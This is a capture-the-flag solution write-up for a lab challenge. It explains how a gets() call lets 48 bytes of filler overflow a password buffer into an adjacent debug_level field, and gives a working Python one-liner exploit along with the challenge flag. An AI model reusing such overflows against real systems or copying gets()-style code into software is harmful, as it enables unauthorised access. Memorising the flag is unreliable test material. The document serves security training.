# PoC — Challenge 03: Ov3rwr1t3

**Flag:** `EPI{whY_lImIT_Our5elVe5_tO_a55i9NEd_vaLUEz}`
**Vulnerability:** Struct field overflow via `gets()` — overwrite `debug_level` field
**Binary:** `/opt/intern/database-reader` (runs as intern)
**Access needed:** SSH as `intern`

---

## Vulnerability

`main()` uses a local struct with two fields:

```c
struct {
    char password[48];
    char debug_level[5];
} locals = {
    .password = {0},
    .debug_level = "guest"
};
// ...
gets(locals.password);   // no bounds check
// ...
if (!strcmp(locals.password, "<REDACTED>") || !strcmp(locals.debug_level, "debug"))
    decode(cipher, key);
```

`password[48]` and `debug_level[5]` are contiguous in the struct. Overflowing `password` writes into `debug_level`. The program decodes the encrypted database if `debug_level == "debug"`.

**Struct layout:**
```
[password 48 bytes][debug_level 5 bytes]
```
48 bytes fills `password`, bytes 49–53 overwrite `debug_level`.

---

## Exploit

→ `scripts/exploit_ov3rwr1t3.py <SSH_PORT>`

**One-liner (from within the intern SSH session):**

```bash
python3 -c "import sys; sys.stdout.buffer.write(b'A'*48 + b'debug\n')" \
  | /opt/intern/database-reader
```

**Flag:** `EPI{whY_lImIT_Our5elVe5_tO_a55i9NEd_vaLUEz}`
